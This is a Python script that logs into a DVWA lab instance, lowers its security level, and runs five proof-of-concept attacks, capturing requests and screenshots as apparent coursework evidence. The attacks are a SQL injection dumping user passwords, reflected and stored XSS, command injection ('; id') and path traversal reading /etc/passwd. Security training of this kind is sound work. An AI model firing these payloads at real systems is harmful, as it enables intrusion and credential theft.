#!/usr/bin/env python3
"""Initialize live DVWA in Kali WSL, capture 5 real HTTP requests/responses,
and capture 5 real Playwright PoC screenshots for Week 3 validation.
"""
from __future__ import annotations

import argparse
import re
import sys
from pathlib import Path

import requests
from playwright.sync_api import sync_playwright

ROOT = Path(__file__).resolve().parents[1]
REQ_DIR = ROOT / "evidence" / "week3" / "requests"
SHOT_DIR = ROOT / "evidence" / "week3" / "screenshots"
DELIV_ASSETS = ROOT / "deliverables" / "assets"


def format_raw_http(req: requests.PreparedRequest, resp: requests.Response) -> str:
    lines = [f"{req.method} {req.path_url} HTTP/1.1"]
    for k, v in req.headers.items():
        if k.lower() == "cookie":
            v = re.sub(r"PHPSESSID=[^;]+", "PHPSESSID=<REDACTED_LAB_SESSION>", v)
        lines.append(f"{k}: {v}")
    lines.append("")
    if req.body:
        body = req.body.decode("utf-8", errors="replace") if isinstance(req.body, bytes) else str(req.body)
        lines.append(body)
    lines.append("")
    lines.append("=== RESPONSE ===")
    lines.append(f"HTTP/1.1 {resp.status_code} {resp.reason}")
    for k, v in resp.headers.items():
        lines.append(f"{k}: {v}")
    lines.append("")
    lines.append(resp.text[:3500])
    return "\n".join(lines)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base-url", required=True, help="e.g. http://172.x.x.x/dvwa")
    args = ap.parse_args()
    base = args.base_url.rstrip("/")

    REQ_DIR.mkdir(parents=True, exist_ok=True)
    SHOT_DIR.mkdir(parents=True, exist_ok=True)
    DELIV_ASSETS.mkdir(parents=True, exist_ok=True)

    with sync_playwright() as p:
        browser = p.chromium.launch()
        context = browser.new_context(viewport={"width": 1280, "height": 820})
        page = context.new_page()

        # 1. Setup / Create DB if needed
        page.goto(f"{base}/setup.php", wait_until="networkidle")
        btn = page.locator("input[name='create_db']")
        if btn.count() > 0:
            btn.click()
            page.wait_for_load_state("networkidle")
            print("DVWA DB setup triggered.")

        # 2. Login as admin:password
        page.goto(f"{base}/login.php", wait_until="networkidle")
        if page.locator("input[name='username']").count() > 0:
            page.fill("input[name='username']", "admin")
            page.fill("input[name='password']", "password")
            page.click("input[name='Login']")
            page.wait_for_load_state("networkidle")
        print("Logged in URL:", page.url)

        # 3. Set security level to low
        page.goto(f"{base}/security.php", wait_until="networkidle")
        if page.locator("select[name='security']").count() > 0:
            page.select_option("select[name='security']", "low")
            page.click("input[name='seclev_submit']")
            page.wait_for_load_state("networkidle")
        print("Security level set to low.")

        # Export cookies to requests.Session for clean raw HTTP captures
        sess = requests.Session()
        for c in context.cookies():
            sess.cookies.set(c["name"], c["value"], domain=c["domain"])

        # Capture baseline requests (for W1/W3 input) & PoC requests + screenshots
        # PoC 1: SQL Injection
        r_sqli = sess.get(f"{base}/vulnerabilities/sqli/", params={"id": "1' UNION SELECT user,password FROM users-- -", "Submit": "Submit"})
        (REQ_DIR / "01-sqli-request.txt").write_text(format_raw_http(r_sqli.request, r_sqli), encoding="utf-8")
        page.goto(f"{base}/vulnerabilities/sqli/", wait_until="networkidle")
        page.fill("input[name='id']", "1' UNION SELECT user,password FROM users-- -")
        page.click("input[name='Submit']")
        page.wait_for_load_state("networkidle")
        page.screenshot(path=str(SHOT_DIR / "poc-01-sqli.png"), full_page=True)
        page.screenshot(path=str(DELIV_ASSETS / "poc-01-sqli.png"), full_page=True)
        print("PoC 1 SQLi ok:", "admin" in page.content())

        # PoC 2: Reflected XSS
        dialogs = []
        page.on("dialog", lambda d: (dialogs.append(d.message), d.accept()))
        r_xss_r = sess.get(f"{base}/vulnerabilities/xss_r/", params={"name": "<script>alert('XSS-R')</script>"})
        (REQ_DIR / "02-xss-reflected-request.txt").write_text(format_raw_http(r_xss_r.request, r_xss_r), encoding="utf-8")
        page.goto(f"{base}/vulnerabilities/xss_r/", wait_until="networkidle")
        page.fill("input[name='name']", "<script>alert('XSS-R')</script>")
        page.click("input[type='submit']")
        page.wait_for_load_state("networkidle")
        page.screenshot(path=str(SHOT_DIR / "poc-02-xss-reflected.png"), full_page=True)
        page.screenshot(path=str(DELIV_ASSETS / "poc-02-xss-reflected.png"), full_page=True)
        print("PoC 2 Reflected XSS dialogs:", dialogs)

        # PoC 3: Stored XSS
        page.goto(f"{base}/vulnerabilities/xss_s/", wait_until="networkidle")
        # Extract user_token if any
        r_xss_s_get = sess.get(f"{base}/vulnerabilities/xss_s/")
        m_tok = re.search(r"name='user_token'\s+value='([^']+)'", r_xss_s_get.text)
        post_data = {"txtName": "VAPT", "mtxMessage": "<script>alert('XSS-S')</script>", "btnSign": "Sign Guestbook"}
        if m_tok:
            post_data["user_token"] = m_tok.group(1)
        r_xss_s = sess.post(f"{base}/vulnerabilities/xss_s/", data=post_data)
        (REQ_DIR / "03-xss-stored-request.txt").write_text(format_raw_http(r_xss_s.request, r_xss_s), encoding="utf-8")
        page.reload(wait_until="networkidle")
        page.screenshot(path=str(SHOT_DIR / "poc-03-xss-stored.png"), full_page=True)
        page.screenshot(path=str(DELIV_ASSETS / "poc-03-xss-stored.png"), full_page=True)
        print("PoC 3 Stored XSS dialogs:", dialogs)

        # PoC 4: Command Injection
        r_cmd = sess.post(f"{base}/vulnerabilities/exec/", data={"ip": "127.0.0.1; id", "Submit": "Submit"})
        (REQ_DIR / "04-cmdi-request.txt").write_text(format_raw_http(r_cmd.request, r_cmd), encoding="utf-8")
        page.goto(f"{base}/vulnerabilities/exec/", wait_until="networkidle")
        page.fill("input[name='ip']", "127.0.0.1; id")
        page.click("input[name='Submit']")
        page.wait_for_load_state("networkidle")
        page.screenshot(path=str(SHOT_DIR / "poc-04-cmdi.png"), full_page=True)
        page.screenshot(path=str(DELIV_ASSETS / "poc-04-cmdi.png"), full_page=True)
        print("PoC 4 CMDi ok:", "www-data" in page.content())

        # PoC 5: Local File Inclusion
        r_lfi = sess.get(f"{base}/vulnerabilities/fi/", params={"page": "../../../../../../etc/passwd"})
        (REQ_DIR / "05-lfi-request.txt").write_text(format_raw_http(r_lfi.request, r_lfi), encoding="utf-8")
        page.goto(f"{base}/vulnerabilities/fi/?page=../../../../../../etc/passwd", wait_until="networkidle")
        page.screenshot(path=str(SHOT_DIR / "poc-05-lfi.png"), full_page=True)
        page.screenshot(path=str(DELIV_ASSETS / "poc-05-lfi.png"), full_page=True)
        print("PoC 5 LFI ok:", "root:x:0:0" in page.content())

        browser.close()
    print("OK all 5 DVWA PoCs captured.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
